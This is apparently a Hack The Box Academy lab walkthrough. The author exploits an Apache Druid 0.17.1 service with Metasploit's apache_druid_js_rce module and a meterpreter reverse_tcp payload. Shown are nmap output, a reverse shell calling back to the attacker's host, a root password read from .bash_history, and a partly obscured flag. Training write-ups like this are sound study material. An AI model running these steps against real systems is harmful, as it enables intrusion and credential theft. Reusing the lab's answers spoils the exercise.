### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Payloads <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.254.229 then 10.129.232.108

hint: We can search in MSF for multiple words.

---

### Question 1:
Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.

Started with a couple nmaps here:
```diff
+ $ sudo nmap -sT -sC -sV -A -F -O -v 10.129.254.229
```

	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-29 23:51 CDT
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	Initiating NSE at 23:51
	Completed NSE at 23:51, 0.00s elapsed
	Initiating NSE at 23:51
	Completed NSE at 23:51, 0.00s elapsed
	Initiating NSE at 23:51
	Completed NSE at 23:51, 0.00s elapsed
	Initiating Ping Scan at 23:51
	Scanning 10.129.254.229 [4 ports]
	Completed Ping Scan at 23:51, 0.04s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 23:51
	Completed Parallel DNS resolution of 1 host. at 23:51, 0.00s elapsed
	Initiating Connect Scan at 23:51
	Scanning 10.129.254.229 [100 ports]
	Discovered open port 8888/tcp on 10.129.254.229
	Discovered open port 22/tcp on 10.129.254.229
	Discovered open port 8081/tcp on 10.129.254.229
	Completed Connect Scan at 23:51, 0.04s elapsed (100 total ports)
	Initiating Service scan at 23:51
	Scanning 3 services on 10.129.254.229
	Completed Service scan at 23:51, 6.07s elapsed (3 services on 1 host)
	Initiating OS detection (try #1) against 10.129.254.229
	Retrying OS detection (try #2) against 10.129.254.229
	Retrying OS detection (try #3) against 10.129.254.229
	Retrying OS detection (try #4) against 10.129.254.229
	Retrying OS detection (try #5) against 10.129.254.229
	Initiating Traceroute at 23:51
	Completed Traceroute at 23:51, 0.01s elapsed
	Initiating Parallel DNS resolution of 2 hosts. at 23:51
	Completed Parallel DNS resolution of 2 hosts. at 23:51, 0.00s elapsed
	NSE: Script scanning 10.129.254.229.
	Initiating NSE at 23:51
	Completed NSE at 23:51, 0.48s elapsed
	Initiating NSE at 23:51
	Completed NSE at 23:51, 0.05s elapsed
	Initiating NSE at 23:51
	Completed NSE at 23:51, 0.00s elapsed
	Nmap scan report for 10.129.254.229
	Host is up (0.0085s latency).
	Not shown: 97 closed tcp ports (conn-refused)
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
	|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
	|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
	8081/tcp open  http    Jetty 9.4.12.v20180830
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	| http-title: Apache Druid
	|_Requested resource was http://10.129.254.229:8081/unified-console.html
	|_http-server-header: Jetty(9.4.12.v20180830)
	8888/tcp open  http    Jetty 9.4.12.v20180830
	| http-title: Apache Druid
	|_Requested resource was http://10.129.254.229:8888/unified-console.html
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Jetty(9.4.12.v20180830)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.94SVN%E=4%D=9/29%OT=22%CT=7%CU=39506%PV=Y%DS=2%DC=T%G=Y%TM=68DB
	OS:61EA%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
	OS:OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552
	OS:ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
	OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
	OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
	OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
	OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
	OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
	OS:%CD=S)
	
	Uptime guess: 41.723 days (since Tue Aug 19 06:30:56 2025)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=263 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	TRACEROUTE (using proto 1/icmp)
	HOP RTT     ADDRESS
	1   8.36 ms 10.10.14.1
	2   8.73 ms 10.129.254.229

Interesting page we find ourself in by visiting this link: http://10.129.254.229:8888/unified-console.html
The pages look identical on both ports serving it. Let's blast off another vuln scan:
```diff
+ $ sudo nmap -sT -A -p 8888,8081 --script=vuln 10.129.254.229
```

	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 00:03 CDT
	Stats: 0:05:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	NSE Timing: About 98.59% done; ETC: 00:09 (0:00:04 remaining)
	Stats: 0:05:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	NSE Timing: About 98.59% done; ETC: 00:09 (0:00:04 remaining)
	Stats: 0:05:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	NSE Timing: About 99.65% done; ETC: 00:09 (0:00:01 remaining)
	Nmap scan report for 10.129.254.229
	Host is up (0.016s latency).
	
	PORT     STATE SERVICE VERSION
	8081/tcp open  http    Jetty 9.4.12.v20180830
	|_http-csrf: Couldn't find any CSRF vulnerabilities.
	|_http-dombased-xss: Couldn't find any DOM based XSS.
	|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
	|_http-server-header: Jetty(9.4.12.v20180830)
	| http-enum: 
	|_  /status/: Potentially interesting folder
	8888/tcp open  http    Jetty 9.4.12.v20180830
	|_http-csrf: Couldn't find any CSRF vulnerabilities.
	|_http-server-header: Jetty(9.4.12.v20180830)
	|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
	|_http-dombased-xss: Couldn't find any DOM based XSS.
	| http-slowloris-check: 
	|   VULNERABLE:
	|   Slowloris DOS attack
	|     State: LIKELY VULNERABLE
	|     IDs:  CVE:CVE-2007-6750
	|       Slowloris tries to keep many connections to the target web server open and hold
	|       them open as long as possible.  It accomplishes this by opening connections to
	|       the target web server and sending a partial request. By doing so, it starves
	|       the http server's resources causing Denial Of Service.
	|       
	|     Disclosure date: 2009-09-17
	|     References:
	|       http://ha.ckers.org/slowloris/
	|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
	| http-enum: 
	|_  /status/: Potentially interesting folder
	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 2 hops

In that scan output the http-enum found /status/. After checking out the url http://10.129.254.229:8081/status, looks like we're presented with a jetty json output of modules it's using, and I recognize at least one of them from a CVE:

	version	"0.17.1"
	modules	
	0	
	name	"org.apache.druid.common.gcp.GcpModule"
	artifact	"druid-gcp-common"
	version	"0.17.1"
	1	
	name	"org.apache.druid.common.aws.AWSModule"
	artifact	"druid-aws-common"
	version	"0.17.1"
	2	
	name	"org.apache.druid.storage.hdfs.HdfsStorageDruidModule"
	artifact	"druid-hdfs-storage"
	version	"0.17.1"
	3	
	name	"org.apache.druid.indexing.kafka.KafkaIndexTaskModule"
	artifact	"druid-kafka-indexing-service"
	version	"0.17.1"
	4	
	name	"org.apache.druid.query.aggregation.datasketches.theta.SketchModule"
	artifact	"druid-datasketches"
	version	"0.17.1"
	5	
	name	"org.apache.druid.query.aggregation.datasketches.theta.oldapi.OldApiSketchModule"
	artifact	"druid-datasketches"
	version	"0.17.1"
	6	
	name	"org.apache.druid.query.aggregation.datasketches.quantiles.DoublesSketchModule"
	artifact	"druid-datasketches"
	version	"0.17.1"
	7	
	name	"org.apache.druid.query.aggregation.datasketches.tuple.ArrayOfDoublesSketchModule"
	artifact	"druid-datasketches"
	version	"0.17.1"
	8	
	name	"org.apache.druid.query.aggregation.datasketches.hll.HllSketchModule"
	artifact	"druid-datasketches"
	version	"0.17.1"
	memory	
	maxMemory	268435456
	totalMemory	268435456
	freeMemory	160828880
	usedMemory	107606576
	directMemory	268435456

Also we're given info on the Response and Request headers on /status/ dir:

	Response:
	Content-Encoding	gzip
	Content-Type	application/json
	Date	Tue, 30 Sep 2025 05:12:00 GMT
	Server	Jetty(9.4.12.v20180830)
	Transfer-Encoding	chunked
	Vary	Accept-Encoding, User-Agent
	
	
	Request:
	Accept	text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Encoding	gzip, deflate
	Accept-Language	en-US,en;q=0.5
	Connection	keep-alive
	DNT	1
	Host	10.129.254.229:8081
	Priority	u=0, i
	Sec-GPC	1
	Upgrade-Insecure-Requests	1
	User-Agent	Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0

On the 8888 version I have access to SQL queries on the druid webapp, which is bad news bears for whoever deployed this monstrosity. But I believe the point of this module is msfvenom. So lets focus on that:
```diff
+ $ msfconsole
```

And lets try the grep search they want us to:
```diff
+ [msf](Jobs:0 Agents:0) >> grep druid search linux exploit
```

	   144   exploit/linux/http/apache_druid_js_rce                                                                                                   2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
	   147   exploit/multi/http/apache_druid_cve_2023_25194                                                                                           2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
```diff
+ [msf](Jobs:0 Agents:0) >> use 144
```

	[*] Using configured payload linux/x64/meterpreter/reverse_tcp

Sick, now lets set the correct params and give it a try:
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> show options
```

	Module options (exploit/linux/http/apache_druid_js_rce):

	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, h
	                                         ttp
	   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT      8888             yes       The target port (TCP)
	   SSL        false            no        Negotiate SSL/TLS for outgoing connections
	   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
	   TARGETURI  /                yes       The base path of Apache Druid
	   URIPATH                     no        The URI to use for this exploit (default is random)
	   VHOST                       no        HTTP server virtual host
	
	
	   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
	                                       on all addresses.
	   SRVPORT  8080             yes       The local port to listen on.
	
	
	Payload options (linux/x64/meterpreter/reverse_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LHOST                   yes       The listen address (an interface may be specified)
	   LPORT  4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Linux (dropper)
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set rhost 10.129.232.108
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set lhost 10.10.15.149
```

Now exploit!
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> exploit
```

	[*] Started reverse TCP handler on 10.10.15.149:4444 
	[*] Running automatic check ("set AutoCheck false" to disable)
	[+] The target is vulnerable.
	[*] Using URL: http://10.10.15.149:8080/LoHzqC1O4H2TlSd
	[*] Client 10.129.232.108 (curl/7.68.0) requested /LoHzqC1O4H2TlSd
	[*] Sending payload to 10.129.232.108 (curl/7.68.0)
	[*] Sending stage (3090404 bytes) to 10.129.232.108
	[*] Meterpreter session 1 opened (10.10.15.149:4444 -> 10.129.232.108:51772) at 2025-09-30 19:39:57 -0500
	[*] Command Stager progress - 100.00% done (120/120 bytes)
	[*] Server stopped.
```diff
+ (Meterpreter 1)(/root/druid) > ls
```

	Listing: /root/druid
	====================
	
	Mode              Size   Type  Last modified              Name
	----              ----   ----  -------------              ----
	100644/rw-r--r--  59403  fil   2020-03-30 20:52:05 -0500  LICENSE
	100644/rw-r--r--  69091  fil   2020-03-30 20:52:06 -0500  NOTICE
	100644/rw-r--r--  8228   fil   2020-03-30 20:54:43 -0500  README
	040755/rwxr-xr-x  4096   dir   2022-05-16 03:45:00 -0500  bin
	040755/rwxr-xr-x  4096   dir   2022-05-11 07:49:31 -0500  conf
	040755/rwxr-xr-x  4096   dir   2022-05-11 07:49:30 -0500  extensions
	040755/rwxr-xr-x  4096   dir   2022-05-11 07:49:30 -0500  hadoop-dependencies
	040755/rwxr-xr-x  12288  dir   2022-05-11 07:49:32 -0500  lib
	040755/rwxr-xr-x  4096   dir   2020-03-30 20:26:02 -0500  licenses
	040755/rwxr-xr-x  4096   dir   2022-05-11 07:49:31 -0500  quickstart
	040755/rwxr-xr-x  4096   dir   2022-05-11 08:09:18 -0500  var

Tap in a quick cd backward:
```diff
+ (Meterpreter 1)(/root/druid) > cd ..
+ (Meterpreter 1)(/root) > ls
```

	Listing: /root
	==============
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100600/rw-------  168   fil   2022-05-16 06:07:41 -0500  .bash_history
	100644/rw-r--r--  3137  fil   2022-05-11 08:43:25 -0500  .bashrc
	040700/rwx------  4096  dir   2022-05-16 06:04:45 -0500  .cache
	040700/rwx------  4096  dir   2022-05-16 05:54:48 -0500  .config
	100644/rw-r--r--  161   fil   2019-12-05 08:39:21 -0600  .profile
	100644/rw-r--r--  75    fil   2022-05-16 03:45:33 -0500  .selected_editor
	040700/rwx------  4096  dir   2021-10-06 12:37:09 -0500  .ssh
	100644/rw-r--r--  212   fil   2022-05-11 09:10:43 -0500  .wget-hsts
	040755/rwxr-xr-x  4096  dir   2022-05-11 07:51:45 -0500  druid
	100755/rwxr-xr-x  95    fil   2022-05-16 05:31:10 -0500  druid.sh
	100644/rw-r--r--  22    fil   2022-05-16 05:01:15 -0500  flag.txt
	040755/rwxr-xr-x  4096  dir   2021-10-06 12:37:19 -0500  snap
```diff
+ (Meterpreter 1)(/root) > cat .bash_history
```

	ls
	rm -rf hygiene.sh 
	loadkeys de
	passwd
	echo "root:HTB_@cademy_admin!" | chpasswd 
	echo '' .bash_history 
	echo '' > .bash_history 
	ls -al
	cat .bash_history 
	poweroff
```diff
+ (Meterpreter 1)(/root) > cat flag.txt
```

	HTB{MSF_Expl0--edit''4t10n}

🚩 found **HTB{MSF_Expl--edit--01t4t10n}**.
